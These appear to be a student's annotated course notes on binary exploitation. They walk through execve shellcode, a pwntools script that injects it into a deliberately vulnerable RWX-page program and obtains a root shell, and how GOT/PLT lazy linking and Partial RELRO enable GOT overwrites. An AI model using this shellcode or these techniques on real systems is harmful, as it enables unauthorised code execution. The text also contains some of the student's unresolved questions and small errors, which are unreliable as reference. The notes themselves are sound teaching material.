# Overview
## part 1: shellcoding
Goal: use assembly code to pop a shell
- execve(ptr to string, , environment vars)
	- rdi, rsi, rdx
	- then calls system call --> put number into rax
	- Summary: if we control rdi, rsi, rdx, rax, then we can effectively make a sys call


**toolbox**
- how to know sth is pushed onto the stack from assembly code?
	- it gets mov into memory addr rbp-0x[sth]
- assembly code in bytes
	- not necessarily 8 bytes long! 
	- how long the assembly instruction is in bytes depends on the assembly code 
- [online defuse assembler](https://defuse.ca/online-x86-assembler.htm#disassembly)
	- to turn assembly instruction into raw bytes
	

## part 2: linking
toolbox: global offset table (GOT), ...? 
when an external function is loaded in at runtime (i.e. dynamically linked), how can I work out its absolute address? 

Summary notes
- if ASLR is enabled, glibc library things and everything local to the binary are randomized independently
- when program runs 
- the .got global offset table is just... an array of addresses? 
	- I thought it was a dictionary instead of array? doesn't it make it super costly then to search for the absolute address of something?
		- yea. 
- "lazy loading" means only resolve absolute addresses (and put into .got) if you actually call that thing that's imported
		- I thought this was the default

toolbox
- Binja to see if a certain memory is rwx 
	- open Memory Map, see either Segments or 
questions
- does "dynamically linked" imply this binary must be PIE?
	- can there be dynamic-linking and no-PIE?

# Notes


Our introduction into binary exploitation involved turning off one of the most common security mitigations, the stack canary, in order to practice stack buffer overflows. This is a rare occurrence in real-world research; some lean embedded, real-time operating systems (RTOS), or internet-of-things (IoT) systems may choose to turn off stack canaries for an incremental boost in performance. But in most cases the combination of a stack buffer overflow _and_ no canary is unlikely. Consequently we will use this lesson to look at different primitives and techniques to target a wider array of systems.
- 


We start first by writing shellcode, which is using our own assembly instructions to force execution of arbitrary instructions by the system. This is an extremely powerful technique if the required vulnerabilities are present. After we look at the Procedure Linkage Table (PLT) and Global Offset Table (GOT) which perform function look-ups in dynamically linked libraries. This functionality is extremely useful if we have read and write vulnerabilities and can be a very powerful target for hijacking execution.

Instead of just teaching the "tricks" of each technique, we will spend the following sections learning more about the fundamental conditions that facilitate the attacks. Understanding how the system operates helps us better understand why these techniques work and will make us more efficient profiling and developing attack strategies against the vulnerabilities.

Table of Contents
* [[#Shellcode]]
	* [[#Simple Shellcoding]]
	* [[#`execve`]]
	* [[#`execve` Example]]
	* [[#Position-independent Shellcode]]  　
* [[#The GOT]]
	* [[#GOT and PLT?]]
	* [[#Linking Strategies]]
	* [[#RELRO]]
	* [[#Using Partial RELRO with Primitives]]
* [[#Recitation]]
* [[#Next Steps]]

## Shellcode

One of the most historically tried-and-true exploitation techniques is using shellcode. Shellcode is comprised of assembly instructions for the target architecture and is named after its purpose: code to pop a shell. Shellcode can have limitations, but if unbounded it is extremely powerful—we can perform any functionality available to us in assembly.

Shellcode is not as popular for hijacking PC as it once was because of modern memory protections.
- shellcode may be obsolete bc of new memory protections

**Requirements to run shellcode:**
	Shellcode requires that an area of memory be _readable, writable, and executable_. 

**What is shellcode:** 
	**we write custom instructions for the victim server to execute**
	- when we run it, are we remaining within the same server program??
Shellcode comes from us, the attacker, and thus is not already written in memory. We first need a writable memory page. We also need `rip` control to be able to read and execute the instructions. An easy to defend against this attack is by simply making all pages in memory writeable _or_ executable. The following permissions define how different data is used in a system:

| Perms | Purpose                                          |
| ----- | ------------------------------------------------ |
| `R-E` | Text (code) to be executed                       |
| `RW-` | Data that may or may not change during execution |
| `R--` | Read-only (`const`) data                         |

If we set aside just-in-time (JIT) compilation for a moment, there is no need for a modern compiled binary to have a page that is `RWX`. Thus, modern systems enforce `W^X` , [_write xor execute_](https://en.wikipedia.org/wiki/W%5EX). 
- JIT allows for write AND executable permissions


**Why shellcode if obsolete?**
	That said, shellcode still has a purpose. It is sometimes possible to `mmap` our own pages into memory with permissions `PROT_WRITE|PROT_READ|PROT_EXEC` or change existing page permissions with `mprotect`. Or perhaps we can use a memory corruption primitive to clobber pages reserved for JIT output and instead execute our own shellcode. Attack and defense is cyclical, and eventually what is old and obsolete becomes once again new and relevant.

Shellcode is also important for our understanding of how to program assembly to manipulate information in memory. Shellcode is still extremely relevant when it comes to later stages of an exploit, which might involve downloading second-stage payloads to execute in the current process address space during an attack. Learning how to write our own instructions pays dividends in a variety of ways.

### Simple Shellcoding

**Example: to change sth in memory or read illicit memory**

Say we have a secret in memory that we need to change, similar to the [[arb_write.c]] example in the last lesson. We end up using an arbitrary write vulnerability to provide an address and value to write at that address. We can write those instructions ourselves with assembly:

```nasm
lea rax, [0x0404030] ; address of secret_value
mov dword ptr [rax], 0xdeadbeef
```

We could also force a leak (of the secret_value, not its addr), like in [[arb_read.c]], with similar instructions:

```nasm
lea rax, [0x404040] ; address of secret_value loads into rax
mov rdi, qword ptr [rax] ; deref rax, put val into rdi
call puts ; print val in rdi (secret_value)
```

Now the value contained by `secret_value` is in `rdi` which we could use in subsequent operations, like a call to `puts` to print the secret.


**Do sth more powerful than printing sth: write our OWN program**
But we can do far more, including creating a full program. 

Let's write a short looping program that counts from zero to ten and returns ten as the return code for the program:
- program purpose: counts from 0 to 10
- return: the number 10

```nasm
.intel_syntax noprefix

.section .bss
    incrementor: .skip 8   # Reserve 8 bytes for one 64-bit integer

.section .text
    .global _start         # defines the entry to the program

_start:
    # Initialize the loop counter to 10
    mov rcx, 10          # rcx = 10 (loop counter)

loop_start:
    # Increment the value stored in the .bss section
    mov rax, [incrementor] # Load the value from incrementor into rax
    inc rax               # Increment the value in rax by 1
    mov [incrementor], rax # Store the incremented value back into incrementor

    # Decrement the loop counter and check if it's zero
    # We could have used loop loop_start here without the decrement, but this is more explicit
    dec rcx               # Decrement rcx by 1
    jnz loop_start        # Jump to loop_start if rcx != 0

    # Exit the program (system call)
    mov rdi, [incrementor] # move the current value of incrementor to report as a return code
    mov rax, 60            # sys_exit system call number
    syscall                # invoke system call
```

This is written in the appropriate syntax for the GNU assembler (GAS) with a note that it uses intel syntax. We can compile and run the program with the following commands to validate the output:

```bash
as --64 -o loop_example.o loop_example.asm && ld -o loop_example loop_example.o
./loop_example 
echo $? # echo return code
# echoes 10
```

Assembly is a full-fledged programming language, though programming in raw assembly instructions is becoming an arcane art. That said, if we end up in a position where we're able to execute instructions, it is incredibly powerful! Let's see how we can use assembly instructions to pop a shell.

### `execve` : what system call RLY is...

We saw in the [[5. Introduction to Binary Exploitation |last lesson]] that the glibc system call `system("/bin/sh")` spawned a shell. But `system` is a glibc function, can we call it directly from shellcode? We could, if we knew its address, using a `call` instruction (similar to any `call` in an x64 binary). But what if we haven't leaked a glibc address to break ASLR? In this case we need to strip away the glibc layer of abstraction to understand the system call underneath.

What we find is that `system` is an alias in glibc for [`__libc_system`](https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/posix/system.c#L201) which calls [`__do_system`](https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/posix/system.c#L101). `__do_system` then calls [`posix_spawn`](https://elixir.bootlin.com/glibc/glibc-2.39/source/posix/spawn.c#L25) which eventually calls `__spawnix` with an  [`execve` argument](https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/spawni.c#L486).  The gist is that `system` essentially wraps a call to `execve`, which is a more granular glibc function for spawning a new process. The `execve` `man` page tells us that it turns the current process into another using a `const char *path` to the program, `char *const argv[]` as arguments, and `char *const envp[]` as environment variables for the new process. This is exactly what we want; triggering an `execve` syscall halts execution in our target, spawns a shell, and waits for us to communicate with it.

Let's take a look at what instructions `execve` executes by compiling a [[execve.c |simple C program]]:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

// compile with `gcc execve.c -o execve`

int main() {
	char* argv[2]; // 3rd item from argument vector (2nd arg)
	argv[0] = "/bin/sh";
	argv[1] = NULL;
	execve(argv[0], argv, NULL); // execve(string, arr of strs, environment vars)
	return 0;
}
```


**Requirements for valid argv:**
> Remember that, when executing a program, Linux expects the `argv` list of character strings to point to the program name itself followed by all arguments. The argument list _must_ be null-terminated otherwise the behavior is undefined. We don't need any arguments for `/bin/sh`, so the snippet above is sufficient to spawn a shell. We likewise do not need any environment variables, so setting `envp` to `NULL` is acceptable.

Let's take a look at [[execve]]'s disassembly to see what the program does at an assembly level:

```nasm
objdump -M intel --disassemble=main execve

0000000000001169 <main>:
    1169:	f3 0f 1e fa          	endbr64
    116d:	55                   	push   rbp
    116e:	48 89 e5             	mov    rbp,rsp
    1171:	48 83 ec 20          	sub    rsp,0x20
    1175:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    117c:	00 00 
    117e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1182:	31 c0                	xor    eax,eax
    1184:	48 8d 05 79 0e 00 00 	lea    rax,[rip+0xe79]        # 2004 <_IO_stdin_used+0x4>
    118b:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
    118f:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
    1196:	00 
    1197:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
    119b:	48 8d 4d e0          	lea    rcx,[rbp-0x20]
    119f:	ba 00 00 00 00       	mov    edx,0x0 🟢
    11a4:	48 89 ce             	mov    rsi,rcx
    11a7:	48 89 c7             	mov    rdi,rax 🟡
    11aa:	e8 c1 fe ff ff       	call   1070 <execve@plt> # CALL EXECVE 🔴
    
    11af:	b8 00 00 00 00       	mov    eax,0x0
    11b4:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    11b8:	64 48 2b 14 25 28 00 	sub    rdx,QWORD PTR fs:0x28
    11bf:	00 00 
    11c1:	74 05                	je     11c8 <main+0x5f>
    11c3:	e8 98 fe ff ff       	call   1060 <__stack_chk_fail@plt>
    11c8:	c9                   	leave
    11c9:	c3                   	ret
```

We clearly see 🟢 the program null-out `rdx`, the `envp` argument, with a `edx,0x0` instruction. 
- calling convention: rdx for 3rd argument

We see that :
🟡 `rdi` is set to the value of `rax` which is previously initialized with `rax,[rip+0xe79]`.  

That address is noted as binary offset `0x2004` and marked with `_IO_stdin_used+0x4`. That doesn't tell us much, because we want to know the data _at_ that address. Let's use the `xxd` command to dump those bytes:

```console
$ xxd -s 0x2004 -l 20 execve
00002004: 2f62 696e 2f73 6800 011b 033b 3000 0000  /bin/sh....;0...
00002014: 0500 0000                                ....
```

Great! So `rdi` is a pointer to `/bin/sh`. `rsi` is the trickiest of the three arguments. We see sequential operations `QWORD PTR [rbp-0x20],rax; QWORD PTR [rbp-0x18],0x0` which store the pointer to `/bin/sh` on the stack and then move `0x0` into the quadword (8 bytes) immediately following it. This sets up two quadwords on the stack:

```
-0x00 pushed rbp
-0x08 ...
-0x10 ...
-0x18 0x0
-0x20 0x2004 -> "/bin/sh"
-0x28 ...
```

So after `lea rcx,[rbp-0x20]; mov rsi, rcx`, `rsi` now holds a pointer to the stack which _points to_ a list of pointers (so we talking about argv now); the first pointer is the `/bin/sh` string and the second is a NULL pointer (signifying the end of the list).

But what about the actual `syscall` instruction? All we see is a call to `execve` in glibc. We can disassemble this function to see that the first instructions set up `rax` to `0x3b` and perform the `syscall` with the argument registers already set by the `execve` function call.

```nasm
objdump -M intel --disassemble=execve /lib/x86_64-linux-gnu/libc.so.6

00000000000eb070 <execve@@GLIBC_2.2.5>:
   eb070:	f3 0f 1e fa          	endbr64
   eb074:	b8 3b 00 00 00       	mov    eax,0x3b
   eb079:	0f 05                	syscall
```

It's worth briefly spinning up gdb to visualize actual addresses for `rsi` and `rdi` and confirm our mental model. Let's break right before the syscall and look at our registers:

```
gef➤  b main
gef➤  r // run
gef➤  b *(execve+9)
gef➤  c // continue to the next breakpoint
gef➤  i r      // short for info registers
rax            0x3b                0x3b  // RAX has syscall number!!!
rbx            0x7fffffffe2f8      0x7fffffffe2f8
rcx            0x7fffffffe1c0      0x7fffffffe1c0
rdx            0x0                 0x0
rsi            0x7fffffffe1c0      0x7fffffffe1c0
rdi            0x555555556004      0x555555556004
```

We see `rdx` equal to `0x0` and `rax` with the syscall number `0x3b`, as expected. Let's confirm that `rdi` is a string:

```
gef➤  x/s $rdi  ($rdi holds a ptr; examine str at that addr)
0x555555556004:	"/bin/sh"
```

That looks good. Let's dump memory at `rsi` to see the list of pointers:
- calling convention: rsi stores 2nd argument

```
gef➤  x/4xg $rsi // examine-memory / four-hex format-giant (chunks of 8 bytes)
0x7fffffffe1c0:	0x0000555555556004	0x0000000000000000
0x7fffffffe1d0:	0x0000000000000000	0x936551a1c367a100
```

We see from the address that `rsi` points to the stack
- HOW do you know??
, and we see the first address stored in the list of pointers is the same address currently stored in `rdi`! When the system iterates through this `argv` list, it will see the executable name defined by the first pointer at `0x0000555555556004`. The next pointer is `NULL`, meaning we pass no arguments to the `/bin/sh` invocation.

### `execve` Example

Let's practice shellcoding by popping a shell on the [[execve_shellcode.c |following program]]. Note that the program stores `/bin/sh` in its data and it is compiled with `-fno-pic -no-pie`, so we know the address of `str`.

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"
#include "sys/mman.h"

// compile with gcc -o execve_shellcode execve_shellcode.c -fno-pic -no-pie

const char str[] = "/bin/sh";
long long two_quadwords[2] = { 0xdeadbeef, 0x1337c0d3 }; // each 8 bytes
// long on 64-bit system is 8 bytes
// long long is therefore 16 bytes WRONG. Ans: 8 bytes (or at least)

int main() {
    void* rwx_page;
    // allocate memory block of size 0x1000 bytes (4096 bytes)
    // it sets the properties of this memory 
    // PROT_READ means this memory is readable
    // this memory is readable, writeable, executable
    rwx_page = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_ANON|MAP_PRIVATE, -1, 0);
    puts("Give me some shellcode to exec!");
    read(0, rwx_page, 0x1000); // read user input max 0x1000
    void (*f)() = rwx_page; // define a function ptr called f, no args
    f(); // run the code at rwx_page
    return 0;
}
```

> The [[execve_shellcode]] program casts the `mmap`'d page as a _function pointer_ and then calls that function. Essentially, it tells the compiler (and thus the program) "treat the data at this address as instructions, and then execute those instructions." This works because we `mmap`d our page with `PROT_READ|PROT_WRITE|PROT_EXEC`, so the data is executable.
> 
> ```c
> void (*f)() = rwx_page;
> f();
> ```

Purpose: 
move the addr of "/bin/sh" into rdi (1st argument)

p.send(
asm('''
lea rdi, [str]   # cuz str is defined as a global var of the value "/bin/sh"
''')
)


The first thing we want to do is set ourselves up to test our shellcode. Let's create a stub (stub means temporary, draft) `pwntools` script and send a single instruction to confirm we gain execution and write instructions into the buffer correctly. The following scripts sets us up for success by:

* Spawning a new program under `gdb` so we can quickly debug quickly in a split `tmux` terminal
* Breakpointing on the `call rdx` instruction at `main + 102` where `rdx` points to our shellcode
* Assembling a single instruction to verify our data lands where it is supposed to
* Waiting for the spawned shell (which we will complete in the next steps)

```python
from pwn import*

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"

e = ELF("./execve_shellcode", checksec=False)
# gdb.debug takes 2 args: the binary to run, multi-line string for gdb cmds
p = gdb.debug("./execve_shellcode", '''
b *(main + 102)
continue
''')
p.recvuntil(b"exec!\n")

s = asm('''
mov rax, 0x0
''')

p.send(s)

p.interactive()
```

This script breaks right before shellcode execution, and we can double check that our input is in the right spot by dumping instructions in `rdx`:
- why are we dumping rdx??
	- how did you decide?


```gdb
[#0] 0x4011dc → main()
gef➤  x/10i $rdx
   0x7ff3b6baa000:      mov    rax,0x0  <-- the instruction WE SENT
   0x7ff3b6baa007:      add    BYTE PTR [rax],al
   0x7ff3b6baa009:      add    BYTE PTR [rax],al
   0x7ff3b6baa00b:      add    BYTE PTR [rax],al
   0x7ff3b6baa00d:      add    BYTE PTR [rax],al
gef➤  x/20xb $rdx
0x7ff3b6baa000: 0x48    0xc7    0xc0    0x00    0x00    0x00    0x00    0x00
0x7ff3b6baa008: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7ff3b6baa010: 0x00    0x00    0x00    0x00
```

Great! That is our single test instruction. The subsequent instructions are all uninitialized data (zeroes) which happen to correspond to the `add BYTE PTR [rax],al` op codes. These crash the system when we step into the shellcode, as shown below, but that is expected because we're only testing our first instruction:

```gdb
gef➤  si
gef➤  p/x $rax
$1 = 0x0
gef➤  si
 → 0x7ff3b6baa007                  add    BYTE PTR [rax], al
   0x7ff3b6baa009                  add    BYTE PTR [rax], al
   0x7ff3b6baa00b                  add    BYTE PTR [rax], al
   0x7ff3b6baa00d                  add    BYTE PTR [rax], al
   0x7ff3b6baa00f                  add    BYTE PTR [rax], al
   0x7ff3b6baa011                  add    BYTE PTR [rax], al
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "execve_shellcod", stopped 0x7ff3b6baa007 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ff3b6baa007 → add BYTE PTR [rax], al
[#1] 0x4011de → main()
```

This example:
- no-PIE
- "/bin/sh" string is found in .data section of the binary already

Great, now we're ready to try out our shellcode. We'll use the fact that this is s a `no-pie` binary with a `/bin/sh` string in the binary's data section to set `rdi` and prepare `rsi`.  The trick for `rsi` is that we need a place in memory to write the `/bin/sh` pointer followed by a null pointer. We'll use the handy `two_quadwords` area of memory in the `bss` to write those addresses.

A handy resource for testing assembly outside of Python is the [Defuse assembler](https://defuse.ca/online-x86-assembler.htm). By setting the architecture to x64 we can quickly test assembly compilation before trying to throw it with `pwntools`.

> It's useful to test shellcode incrementally. Write a few instructions and see if they accomplish the intended behavior before moving on. For example, if we want to move the address of the `str` string into `rdi` we can assemble the `lea rdi, [0x402008]` instruction, send it in `pwntools`, and step through the instructions in the shellcode with `si`. Once we see the instruction execute we should test that `rdi` has its correct value by printing the string at `rdi` with `x/s $rdi` in GDB. Being rigorous in testing small, incremental changes can help us identify errors quickly rather than spending a lot of time debugging large changes where the error is not easily identifiable.

The following `pwntools` assembly mimics the operations we saw in the previous example to set up registers and perform a syscall. There are a variety of ways we could set the registers, so this is certainly not the only answer.

```python
# leverage pwntools ELF to find the symbol addresses for us and input
# as a format string
s = asm('''
mov rdx, 0x0
lea rdi, [{}] <--- {placeholder} for insertions
lea rax, [{}] <--- {placeholder} for insertions
mov qword ptr [rax], rdi
mov qword ptr [rax + 8], 0x0
mov rsi, rax
mov rax, 0x3b 
syscall
'''.format(e.symbols.str, e.symbols.two_quadwords))
```

We are now ready to try throwing our first shellcode! If we step over the `syscall` instruction during execution and see `process <number here> is executing new program: /usr/bin/dash`, this means `gdb` is executing a new process as we intended! We can jump back to our Python interactive terminal and execute commands, and we have a full shell at our command!

```console
[DEBUG] Sent 0x2e bytes:
    00000000  48 c7 c2 00  00 00 00 48  8d 3c 25 08  20 40 00 48  │H···│···H│·<%·│ @·H│
    00000010  8d 04 25 30  40 40 00 48  89 38 48 c7  40 08 00 00  │··%0│@@·H│·8H·│@···│
    00000020  00 00 48 89  c6 48 c7 c0  3b 00 00 00  0f 05        │··H·│·H··│;···│··│
    0000002e
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x1f bytes:
    b'Detaching from process 2463071\n'
Detaching from process 2463071
[DEBUG] Received 0x5 bytes:
    b'root\n'
root
$  
```

### Position-independent Shellcode
- Overview: 
	- don't need a leak of address if your buffer is on the stack?

This exploit depends on a couple assumptions and capabilities, specifically that we have the address of `/bin/sh` (either by leaking glibc, which always contains `/bin/sh` somewhere in it, or finding it in the binary itself) and that we have a place to write `rsi`'s pointers. There is a way around this with _position-independent_ shellcode. The popular infosec valentine—which you are free to share with your favorite target—shows this in action:

![[position_independent_shellcode_valentine.PNG]]

There are two tricks in this shellcode to bypass the limitations we had before:
* `mov rax, 0x00752076756c2069` moves the string `i luv u\0` into `rax`. This is done in reverse to account for little-endianness
* Pushing this to the stack now means that `sp` _points to the string_. Moving `rsp` into `rsi` means `rsi` now points the the string as well!

This little trick of pushing bytes to the stack and using `sp` as a pointer turns `sp` into a pointer to an arbitrary string! We can then set other registers with `sp` and use a `syscall` to write this data to the console, as shown in the valentine, or perform other syscalls.

Think about how we can use this same strategy to set up the registers for an `execve` syscall as we did before. It's a bit more complicated, but with a few more instructions we can set `rdi` and `rsi` using values on the stack, without ever knowing a stack, binary, or glibc address! This is an extremely powerful concept in shellcoding.


Summary of shellcode exploit:
- buffer overflow --> craft input to contain shellcode and desired return addr (addr of our shellcode) --> function returns to our desired shellcode --> our shellcode executes --> spawn shell

- how to know the addr of our injected shellcode???







## The GOT

- a page is just a memory block
The greatest limitation with shellcode is the ability to map an RWX page or change existing page permissions with `mprotect`, which may be disabled with [SELinux memory protections](https://www.akkadia.org/drepper/selinux-mem.html). We'll look next at a modern technique that can be extremely useful for bypassing ASLR with a read primitive (exploit vulnerability to read illicit ) and can hijack execution flow given a write primitive. But first, we need to understand the GOT and the PLT.

### GOT and PLT?

At this point we have a lot of experience with dynamically linked binaries which leverage functions from other libraries loaded into the program's virtual memory space. But how does the program actually resolve these symbols? Does the linker write every library function's randomized address into the binary's R/W memory after loading each library? Do we have some centralized repository of exports and their address? The answer is the GOT and the PLT.

Because of ASLR, we need a way to resolve function import addresses during each execution without heavily modification of an executable. The solution is the Global Offset Table (GOT) and Procedure Linkage Table (PLT) which serve as trampolines between binaries/libraries. Instead of calling a function in, say, glibc _directly_, the executable instead jumps into its PLT table. Let's see this in action with the [[got.c |following program]]:

```c
#include "stdio.h"
#include "stdlib.h"

// compile with `gcc got.c -o got`

int main() {
	puts("Let's jump to _puts_ now");
	puts("Let's jump to _puts_ again");
	printf("Now let's use %s\n", "printf");
	return 0;
}
```

Inspecting [[got]]'s assembly, specifically the `puts` call, we see the address called is actually in the binary at offset `puts@plt=0x1060` and not glibc. If we look at the instructions there, we see a stub function:

```nasm
$ objdump --disassemble=main -M intel got

0000000000001169 <main>:
    1169:	f3 0f 1e fa          	endbr64
    116d:	55                   	push   rbp
    116e:	48 89 e5             	mov    rbp,rsp
    1171:	48 8d 05 8c 0e 00 00 	lea    rax,[rip+0xe8c]        # 2004 <_IO_stdin_used+0x4>
    1178:	48 89 c7             	mov    rdi,rax
    117b:	e8 e0 fe ff ff       	call   1060 <puts@plt>
    1180:	48 8d 05 96 0e 00 00 	lea    rax,[rip+0xe96]        # 201d <_IO_stdin_used+0x1d>
    1187:	48 89 c7             	mov    rdi,rax
    118a:	e8 d1 fe ff ff       	call   1060 <puts@plt>
    118f:	48 8d 05 a2 0e 00 00 	lea    rax,[rip+0xea2]        # 2038 <_IO_stdin_used+0x38>
    1196:	48 89 c6             	mov    rsi,rax
    1199:	48 8d 05 9f 0e 00 00 	lea    rax,[rip+0xe9f]        # 203f <_IO_stdin_used+0x3f>
    11a0:	48 89 c7             	mov    rdi,rax
    11a3:	b8 00 00 00 00       	mov    eax,0x0
    11a8:	e8 c3 fe ff ff       	call   1070 <printf@plt>
    11ad:	b8 00 00 00 00       	mov    eax,0x0
    11b2:	5d                   	pop    rbp
    11b3:	c3                   	ret

$ objdump -d --start-address=0x1060 -M intel got | head -n 10

Disassembly of section .plt.sec:

0000000000001060 <puts@plt>:
    1060:	f3 0f 1e fa          	endbr64
    1064:	ff 25 5e 2f 00 00    	jmp    QWORD PTR [rip+0x2f5e]        # 3fc8 <puts@GLIBC_2.2.5>
    106a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
```

This is an address in the PLT section which is the beginning of the trampoline. PLT functions for all imported functions look very similar; they consist of the `endbr64` instruction followed by a `jump` to another address. Though this address says `puts@GLIBC_2.2.5`, it's again a binary address at offset `0x3fc8`. If we take a look at the section headers with `readelf -Wl got`, we realize this offset is not even in the binary!

```console
$ readelf -Wl got

Elf file type is DYN (Position-Independent Executable file)
Entry point 0x1080
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0002d8 0x0002d8 R   0x8
  INTERP         0x000318 0x0000000000000318 0x0000000000000318 0x00001c 0x00001c R   0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000660 0x000660 R   0x1000
  LOAD           0x001000 0x0000000000001000 0x0000000000001000 0x0001c1 0x0001c1 R E 0x1000
  LOAD           0x002000 0x0000000000002000 0x0000000000002000 0x000134 0x000134 R   0x1000
  LOAD           0x002db0 0x0000000000003db0 0x0000000000003db0 0x000260 0x000268 RW  0x1000
  DYNAMIC        0x002dc0 0x0000000000003dc0 0x0000000000003dc0 0x0001f0 0x0001f0 RW  0x8
  NOTE           0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8
  NOTE           0x000368 0x0000000000000368 0x0000000000000368 0x000044 0x000044 R   0x4
  GNU_PROPERTY   0x000338 0x0000000000000338 0x0000000000000338 0x000030 0x000030 R   0x8
  GNU_EH_FRAME   0x002054 0x0000000000002054 0x0000000000002054 0x000034 0x000034 R   0x4
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
  GNU_RELRO      0x002db0 0x0000000000003db0 0x0000000000003db0 0x000250 0x000250 R   0x1
```

We need the help of a decompiler to resolve this for us, so let's open the binary in Binja and navigate to that address:

![[binja_got.png]]

We see Binja has automatically resolved a new `.got` section for us, including placeholder addresses for all imports (if we double click the `puts` symbol to the right of the assignment, we are directed to a "fake" `.extern` section). The GOT is essentially a table of entries for each import. But what data actually exists here at runtime? Let's boot the binary in `gdb` and investigate, using the base address of the binary plus the offset `0x3fc8` from above:

```gdb
gef➤  b main
gef➤  r
gef➤  x/xg (0x0000555555554000+0x3fc8)
0x555555557fc8 <puts@got.plt>:	0x00007ffff7c83630
gef➤  x/10i 0x00007ffff7c83630
   0x7ffff7c83630 <__GI__IO_puts>:	endbr64
   0x7ffff7c83634 <__GI__IO_puts+4>:	push   r14
   0x7ffff7c83636 <__GI__IO_puts+6>:	push   r13
   0x7ffff7c83638 <__GI__IO_puts+8>:	push   r12
   0x7ffff7c8363a <__GI__IO_puts+10>:	push   rbp
```

We see that the GOT entry stores a pointer to the beginning of `puts` code in glibc. So the GOT stores a bunch of pointers to the imported functionality, completing the trampoline to the function of interest in whatever library defines it. But there is more to the story here, and for that we must understand absolute versus lazy linking.

### Linking Strategies

Though we've confirmed what the GOT stores, we don't yet know how and when these values are set. So how is the GOT populated? The answer is _it depends_.

The linker/loader, `ld`, is responsible for loading libraries and the executable into the memory space and linking them together. Once the ELFs are loaded, we have some flexibility as to how the links are configured. The first option is to have the linker resolve all the links immediately, such as our link between the `puts` call point in `main` and the `puts` address in glibc. In this case the linker resolves the randomized address of `puts` and stores it in the binary's GOT table before `main` even starts executing. This option is not necessarily preferred in all cases; consider a program with a lot of imports from a lot of libraries. The process of resolving these links and updating the GOT could add significant start-up time every time the program boots. What happens if the current execution does not require all imports? What if it only uses a handful of functions in most use cases? That could result in a lot of wasted time and could be unacceptable in certain circumstances, especially on systems that require minimum latency. An alternative is _lazy linking_, which instructs the linker to resolve the randomize address _only when needed_. This results in linking to the imported function when the program first uses it. All subsequent calls will use the resolution previously performed and call into the library directly. The result is a slight performance impact during execution the first time a function is called, though this performance hit only occurs for called functions. Any function not called during execution will not be resolved!

What we investigated previously was absolute relocation, which is the default for `gcc`. Let's instead compile the binary with the following flags to force lazy linking of imports: `gcc -Wl,-z,relro -no-pie -fno-pic -o got_partial got.c`. Let's debug [[got_partial]] in `gdb` before and after the call to `puts` to see how the GOT is initialized and updated:

```gdb
gef➤  b main
gef➤  r
[#0] 0x40115e → main()
gef➤  x/2xg 0x404000
0x404000 <puts@got.plt>:	0x0000000000401030	0x0000000000401040
```

Instead of seeing a glibc address in the GOT, we see a binary address. Dumping instructions at that address show the following operations:

```gdb
gef➤  x/4i 0x0000000000401030
   0x401030:	endbr64
   0x401034:	push   0x0
   0x401039:	jmp    0x401020
```

We can compare this with the GOT value for `printf`, which lives right after `puts` in the table:

```gdb
gef➤  x/4i 0x0000000000401040
   0x401040:	endbr64
   0x401044:	push   0x1
   0x401049:	jmp    0x401020
   0x40104e:	xchg   ax,ax
```

These both look similar; they update `rax` to an index and `jmp`ing to the following code:

```gdb
gef➤  x/10i 0x401020
   0x401020:	push   QWORD PTR [rip+0x2fca]        # 0x403ff0
   0x401026:	jmp    QWORD PTR [rip+0x2fcc]        # 0x403ff8
```

If we step through execution with `si` a couple times, we find that we wind up in the loader's function `_dl_runtime_resolve_xsave`. This is the function that will dynamically resolve the requested function's (`puts`'s) address and call that function. If we finish the function call and now inspect the GOT, we see it is updated to a glibc address!

```gdb
gef➤  x/2xg 0x404000
0x404000 <puts@got.plt>:	0x00007ffff7c83630	0x0000000000401040
gef➤  x/4i 0x00007ffff7c83630
   0x7ffff7c83630 <__GI__IO_puts>:	endbr64
   0x7ffff7c83634 <__GI__IO_puts+4>:	push   r14
   0x7ffff7c83636 <__GI__IO_puts+6>:	push   r13
   0x7ffff7c83638 <__GI__IO_puts+8>:	push   r12
```

Now the GOT looks like the previous example with absolute linking—all subsequent calls will jump from the PLT directly to glibc using the GOT entry's stored address.

> Note that `printf`'s GOT entry is still pointing at the binary's stub code which calls into `_dl_runtime_resolve_xsave`, because it has not yet been used. After it is called this value is similarly updated to the address of `printf`'s code in glibc.

### RELRO
- Why we care about .got tables?
	- imagine: the original program calls puts, but we change which address the .got table entry for puts points to --> e.g. we change it to point to system call --> we do all the prep work of manipulating registers so we effectively can call system("/bin/sh") --> when puts gets called, system() gets called! 
	- this assumes we can write to .got table
		- this requires "lazy loading" to be in action
		- otherwise, .got table is read-only, and we cannot "poison" the .got table, so to speak
			- run pwn  checksec --file=[sth] to see what RELRO mode we are in
			- if RELRO = Full RELRO, it means .got is read-only and we can't exploit it
			- if RELRO = Partial RELRO, .got CAN be written so we can potentially exploit it :)



